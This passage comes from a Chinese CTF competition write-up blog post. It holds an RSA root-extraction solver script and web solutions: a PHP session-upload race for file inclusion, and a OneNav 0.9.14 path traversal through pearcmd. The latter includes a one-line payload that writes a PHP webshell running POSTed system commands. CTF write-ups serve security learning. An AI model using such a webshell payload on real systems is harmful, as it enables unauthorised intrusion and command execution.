8310151988085860771226135398874764307621316769660563267495107758782855420167201345224621932233009864886459191650276831555553606018772356624861344010051427084784712615419584399034171295434663517111130692609510225248850800086750351336299722121740091690781297611587292792380263994661373171593543809045588215109967008287273462651359353786188222933360961215432623197670015133463997036747979075992284955864774118038735419327630590319728196257908297742808557311174379279085833900573941668601788656519597930019583786869324790276024107739682158108450127890693464079075924933789639419538796893294354565682012619667240947317948</span><br><span class="line">n = p*q</span><br><span class="line">def AMM(o, r, q):</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(&#x27;\n----------------------------------------------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;)</span><br><span class="line">    print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(1, q))</span><br><span class="line">    while p ^ ((q-1) // r) == 1:</span><br><span class="line">        p = g(random.randint(1, q))</span><br><span class="line">    print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p))</span><br><span class="line">    t = 0</span><br><span class="line">    s = q - 1</span><br><span class="line">    while s % r == 0:</span><br><span class="line">        t += 1</span><br><span class="line">        s = s // r</span><br><span class="line">    print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t))</span><br><span class="line">    k = 1</span><br><span class="line">    while (k * s + 1) % r != 0:</span><br><span class="line">        k += 1</span><br><span class="line">    alp = (k * s + 1) // r</span><br><span class="line">    print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp))</span><br><span class="line">    a = p ^ (r**(t-1) * s)</span><br><span class="line">    b = o ^ (r*alp - 1)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = 1</span><br><span class="line">    for i in range(1, t):</span><br><span class="line">        d = b ^ (r^(t-1-i))</span><br><span class="line">        if d == 1:</span><br><span class="line">            j = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;[+] Calculating DLP...&#x27;)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            print(&#x27;[+] Finish DLP...&#x27;)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">    print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def onemod(p,r): </span><br><span class="line">    t=p-2 </span><br><span class="line">    while pow(t,(p-1) // r,p)==1: </span><br><span class="line">        t -= 1 </span><br><span class="line">    return pow(t,(p-1) // r,p) </span><br><span class="line"></span><br><span class="line">def solution(p,root,e):  </span><br><span class="line">    g = onemod(p,e) </span><br><span class="line">    may = set() </span><br><span class="line">    for i in range(e): </span><br><span class="line">        may.add(root * pow(g,i,p)%p) </span><br><span class="line">    return may</span><br><span class="line">def union(x1, x2):</span><br><span class="line">    a1, m1 = x1</span><br><span class="line">    a2, m2 = x2</span><br><span class="line">    d = gmpy2.gcd(m1, m2)</span><br><span class="line">    assert (a2 - a1) % d == 0</span><br><span class="line">    p1,p2 = m1 // d,m2 // d</span><br><span class="line">    _,l1,l2 = gmpy2.gcdext(p1,p2)</span><br><span class="line">    k = -((a1 - a2) // d) * l1</span><br><span class="line">    lcm = gmpy2.lcm(m1,m2)</span><br><span class="line">    ans = (a1 + k * m1) % lcm</span><br><span class="line">    return ans,lcm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def excrt(ai,mi):</span><br><span class="line">    tmp = zip(ai,mi)</span><br><span class="line">    return reduce(union, tmp)</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp,e,p)</span><br><span class="line">mq = AMM(cq,e,q)</span><br><span class="line">mps = solution(p,mp,e)</span><br><span class="line">mqs = solution(q,mq,e)</span><br><span class="line">for mpp in tqdm(mps):</span><br><span class="line">    for mqq in mqs:</span><br><span class="line">        ai = [int(mpp),int(mqq)]</span><br><span class="line">        mi = [p,q]</span><br><span class="line">        m = CRT_list(ai,mi)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        if b&#x27;flag&#x27; in flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="多页面爬取"><a href="#多页面爬取" class="headerlink" title="多页面爬取"></a>多页面爬取</h3><p>抓包爆破 每一个页面下的字母合并即可</p>
+<h3 id="lfi-system"><a href="#lfi-system" class="headerlink" title="lfi_system"></a>lfi_system</h3><p>dirsearch扫描 发现php.php</p>
+<p>寻找到 session.upload_progress.enabled &#x3D; on开启的</p>
+<p>由于session.upload_progress.cleanup默认开启 需要利用条件竞争来读取session文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_46918279/article/details/120106832#WEB82-session</span><br><span class="line">文件包含</span><br></pre></td></tr></table></figure>
+
+<p>采用bp抓包手动爆破</p>
+<p>构造上传文件的页面，对环境上传文件，然后抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://47.105.39.3:22003/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ebfc151d.png" alt="image-20221223170254461" data-caption="image-20221223170254461" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ecf346ce.png" alt="image-20221223170309946" data-caption="image-20221223170309946" loading="lazy"></p>
+<p>设置两项 条件竞争即可</p>
+<h3 id="onenav"><a href="#onenav" class="headerlink" title="onenav"></a>onenav</h3><p>打开发现为onenav框架，通过github查看源码得知存在version.txt文件。访问可以得到版本号为0.9.14</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ee978df2.png" alt="image-20221223170336199" data-caption="image-20221223170336199" loading="lazy"></p>
+<p>搜索相应版本漏洞，在github发现存在路径穿越漏洞，但没有详细，对比0.9.14与0.9.15发现最后过滤了 ..&#x2F; 与 .&#x2F; ，且后面once_include()中存在可控参数</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56eff4767d.png" alt="image-20221223170357983" data-caption="image-20221223170357983" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f0916cc3.png" alt="image-20221223170407731" data-caption="image-20221223170407731" loading="lazy"></p>
+<p>接着通过pearcmd执行系统命令即可，本来想反弹shell，但发现空格绕过一直绕不过去，最后想到直接获取$_POST参数来执行命令就是了。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;c=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=system($_POST[&#x27;a&#x27;])?&gt;+/tmp/hello1.php</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f1e3c9d3.png" alt="image-20221223170428836" data-caption="image-20221223170428836" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56f26df569.png" alt="image-20221223170437570" data-caption="image-20221223170437570" loading="lazy"></p>
+
+    <p><img data-fancybox="gallery" src="https://www.luminesight.com/cdn/Server/ShouKuanMA.jpg"  alt="ShouKuanMA.jpg" data-caption="ShouKuanMA.jpg" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>JunHou<br>
+        <strong>Link：</strong><a href="http://runctf.cn/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/" title="http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;23&#x2F;%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;23&#x2F;%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-pyc"><span class="toc-number">1.1.</span> <span class="toc-text">misc_pyc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">好玩的编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happyImg"><span class="toc-number">1.3.</span> <span class="toc-text">happyImg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%AF%BB%E7%BB%BC"><span class="toc-number">1.4.</span> <span class="toc-text">网络寻综</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3des"><span class="toc-number">2.1.</span> <span class="toc-text">3des</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happyRSA"><span class="toc-number">2.2.</span> <span class="toc-text">happyRSA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E9%A1%B5%E9%9D%A2%E7%88%AC%E5%8F%96"><span class="toc-number">3.1.</span> <span class="toc-text">多页面爬取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lfi-system"><span class="toc-number">3.2.</span> <span class="toc-text">lfi_system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#onenav"><span class="toc-number">3.3.</span> <span class="toc-text">onenav</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/piao.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/shehuizhuyi.js"></script><!-- 点击出现爱心 --><script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/love.js"></script><!-- 点击出现彩色气球爆炸效果 --><canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js"></script>
+    <!-- themes/[theme_name]/layout/_script/comments.swig -->
+    {% include '_comments/gitalk.swig' %}
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1673454978719"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
